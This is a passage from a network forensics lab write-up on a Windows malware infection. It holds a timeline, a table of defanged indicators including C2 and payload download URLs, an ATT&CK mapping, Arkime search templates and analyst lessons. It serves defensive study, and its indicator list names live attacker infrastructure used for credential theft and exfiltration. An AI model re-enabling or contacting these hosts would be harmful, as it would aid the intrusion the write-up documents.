| 21:36:47, 21:37:17 | SMBv1 sweep of 445 — refused |
| 21:36:52–21:37:52 | Four `/81/` credential POSTs to 203.176.135.102:8082 |
| 21:36:59–21:38:49 | `/90` reconnaissance POST (5,366 bytes) |
| 21:42–21:46 | More C2 (449) and downloads (447, 443) |
| 21:46:06 | Last malicious session ends |
| 22:06:41 | Capture ends |

## Indicators of compromise { #iocs }

| Type | Indicator | Role |
|---|---|---|
| URL | `hxxp://bolton-tech[.]com/YAS20.exe` | First-stage download |
| IP | `50.87.248[.]17` | bolton-tech.com (shared hosting) |
| URL | `hxxp://64.44.133[.]131/images/cursor.png`, `/images/imgpaper.png` | Disguised payloads |
| URL | `hxxp://203.176.135[.]102:8082/yas20/LAPTOP-7XMV2SN_W10018363.CF3A0EAB425F1927835EF064A69CAED6/81/` (`/90`) | HTTP exfiltration |
| IP:port | `190.214.13[.]2:449` | TLS C2 |
| IP:port | `185.14.31[.]98:447` | TLS download, self-signed cert |
| IP:port | `185.180.198[.]50:447` | C2 (no answer) |
| IP | `51.254.164[.]244` | TLS 443, self-signed |
| Domain/IP | `filmstore[.]xyz` 45.148.120[.]153, `hakunamatatata[.]com` 199.247.13[.]144, `helpforyourservice[.]com` 209.97.130[.]197 | Suspicious TLS downloads |
| Certificate | CN `example.com`, O `Global Security`, OU `IT Department`, serial `008be295cd71603289` | C2 server certificate |
| JA3 / JA3S | `72a589da586844d7f0818ce684948eea` / `e35df3e00ca4ef31d42b34bebaa2f86e` | TLS fingerprints (may overlap with legitimate software) |
| MD5 | `179345004c39336eaba39863b95f268b`, `9dfb3952172deeddb3a5e3cafed933bc`, `e40d7846eae7d8a98c0e3512e5461e4c` | HTTP bodies of the three downloads |
| User-Agent | `KSKJJGJ`, `WinHTTP loader/1.0`, `Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E)` | Malware modules |
| Process | `VMMM;;;;영상ثافوزبت.exe` | Host IOC from the uploaded process list |
| Domain | `checkip.amazonaws[.]com` | Legitimate service abused for IP discovery (context only, not a block target) |

## ATT&CK mapping { #attack }

| Technique | Evidence |
|---|---|
| T1059 Command and Scripting Interpreter | `WinHttp.WinHttpRequest.5` download (script inferred) |
| T1105 Ingress Tool Transfer | YAS20.exe, "png" payloads, 447/443 downloads |
| T1016.001 Internet Connection Discovery | checkip.amazonaws.com |
| T1057, T1082, T1016, T1482, T1087 Discovery | proclist, systeminfo, ipconfig, net, nltest, admin names |
| T1555.003 Credentials from Web Browsers | `/81/` IE and Firefox passwords |
| T1071.001 Web Protocols, T1573 Encrypted Channel | HTTP 8082 and TLS 449/447 C2 |
| T1041 Exfiltration Over C2 Channel | `/81/`, `/90` POSTs |
| T1021.002 SMB/Windows Admin Shares (attempt) | SMBv1 sweep of 445, refused |

---

## Copy-ready query sheet { #query-sheet }

Replace `<…>`. If several labs are imported, prefix each search with `tags == <lab-tag> &&`.

**Orientation**

```text
ip.dst == <server-IP>
```

```text
ip.src == <internal-CIDR> && protocols == krb5
```

```text
ip.src == <host-IP> && protocols == krb5
```

```text
ip.src == <external-IP>
```

**HTTP**

```text
ip.src == <internal-CIDR> && protocols == http
```

```text
http.bodymagic == application/x-dosexec
```

```text
http.method == POST
```

```text
http.method == POST && ip.dst == <C2-IP> && http.uri == *<string>*
```

```text
http.user-agent == "<user-agent>"
```

```text
host.http == <domain> || ip.dst == <IP-1> || ip.dst == <IP-2>
```

**Hidden channels and certificates**

```text
ip.src == <host-IP> && ip.dst != 10.0.0.0/8 && ip.dst != 172.16.0.0/12 && ip.dst != 192.168.0.0/16 && ip.dst != 224.0.0.0/4 && port.dst != 80 && port.dst != 443 && port.dst != 53
```

```text
ip.src == <host-IP> && protocols == tls
```

```text
tags == "cert:self-signed"
```

```text
cert.issuer.cn == <name> || cert.issuer.on == "<org name>" || cert.subject.cn == [<domain-1>, <domain-2>]
```

```text
ip.src == <host-IP> && (ip.dst == <IP-1> || ip.dst == <IP-2> || cert.issuer.cn == <name>)
```

**Scope**

```text
ip.src == <host-IP> && ip.dst == <internal-CIDR> && ip.dst != <DC-IP>
```

```text
ip.src == <host-IP> && ip.dst == <internal-CIDR> && port.dst == [445, 135, 139, 3389, 5985]
```

```text
ip.dst == [<IOC-IP-1>, <IOC-IP-2>, <IOC-IP-3>] && ip.src != <host-IP>
```

### Operators { #operators }

| Operator | Meaning | Example |
|---|---|---|
| `==` | equals | `ip.dst == 10.3.11.3` |
| `!=` | not equal | `port.dst != 443` |
| `&&` | and (both) | `ip.src == 10.3.11.194 && protocols == tls` |
| <code>&#124;&#124;</code> | or (any one) | <code>ip.dst == 1.2.3.4 &#124;&#124; ip.dst == 5.6.7.8</code> |
| `( )` | grouping | <code>ip.src == X && (A &#124;&#124; B)</code> |
| `[a, b]` | any of a list | `port.dst == [445, 3389]` |
| `*` | wildcard | `http.uri == *81*` |
| `"…"` | values with spaces/special characters | `cert.issuer.on == "Internet Widgits Pty Ltd"` |
| `/n` | CIDR range | `ip.dst == 10.3.11.0/24` |

### Where to click { #where-to-click }

| Task | Where |
|---|---|
| Field values and counts | SPI View → section → click the field name or **Load All** |
| Add a value to the search | Click the value → **and** / **or** / **and not** |
| See the body instead of a file link | Session → **Packet Options → Hide Images & Files**, then `ascii` / `hex` |
| Raw bytes for CyberChef | Session → **Source Raw** (client side) / **Destination Raw** (server side) |
| Evidence for the report | Session → **Download PCAP** |
| Start/end of data | Sessions → sort **Start Time** ascending / **Stop Time** descending |
| Large transfers | Timeline chart → **Bytes** |
| Time zone | Settings → General → Timezone Format → **UTC** |

### CyberChef recipes used { #cyberchef-recipes }

| Recipe | Used for |
|---|---|
| From Base64 | Odd header values ending in `=` / `==` |
| URL Decode | `%2F`-style encoded URIs and POST bodies |
| From UNIX Timestamp (ms) | Numbers like `1583961855884` in URLs → `2020-03-11 21:24:15 UTC` |
| Detect File Type / Strings | Bodies exported with Source/Destination Raw |
| MD5 / SHA256 | Hashes of downloaded bodies |
| Defang URL / Defang IP Addresses | IOC lists in reports |

---

## Lessons learned { #lessons }

- **Fix the time range and time zone first.** "Arkime shows nothing" is usually the Last-hour default; times off by 10 hours are the time zone.
- **SPI View counts, it does not pair.** Numbers that line up (5 POSTs = 5 C2 URIs) are an **inference**. Confirm with a direct search or the session detail before writing it in a report.
- **Same name in Issuer and Subject is not proof of self-signing** — a chain looks the same. Check inside one certificate, or use the `cert:self-signed` tag.
- **Remove noise before hunting:** Windows update/OCSP, fonts, CDNs, multicast, NetBIOS broadcast.
- **Cleartext C2 is a gift.** Hide Images & Files and read the POST bodies: they named the victim, the stolen accounts and the attacker's next move.
- **Read TCP flags and byte direction** to tell "connected and transferred" from "probed and refused".
- **Line up host and network evidence.** ipconfig MAC = Arkime MAC; `net view` = the NetBIOS burst.
- **Ruling out is evidence too.** Log the benign external initiator, the refused SMB probes and the 0-result scope check as Not Found.
- **On a closed network, stack several behavioural clues**, and write malware names as "consistent with".
- **Mask secrets and defang IOCs** in anything others will read.
